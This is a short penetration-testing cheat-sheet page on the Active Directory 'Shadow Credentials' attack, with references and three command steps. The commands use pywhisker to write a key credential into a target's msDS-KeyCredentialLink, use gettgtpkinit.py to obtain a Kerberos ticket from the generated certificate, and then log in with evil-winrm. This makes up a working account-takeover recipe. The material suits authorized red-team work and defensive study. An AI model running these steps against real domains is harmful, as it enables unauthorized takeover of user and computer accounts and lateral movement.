# Shadow Credentials Attack

## Shadow Credentials Attack [t-ad-acl-shadow_credentials]

### Overview

In some cases it is possible to add "Key Credentials" to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT.


### References:

* [https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

* [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)

### 1.1 Create and add a certificate to the object`s msDS-KeyCredentialLink attribute



{% code overflow="wrap" %}
```bash
pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k
```
{% endcode %}

### 1.2 Use the pfx file to get a TGT using gettgtpkinit.py



{% code overflow="wrap" %}
```bash
python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache
```
{% endcode %}

### 1.3 Connect using any of tools supporting kerberos



{% code overflow="wrap" %}
```bash
KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user
```
{% endcode %}

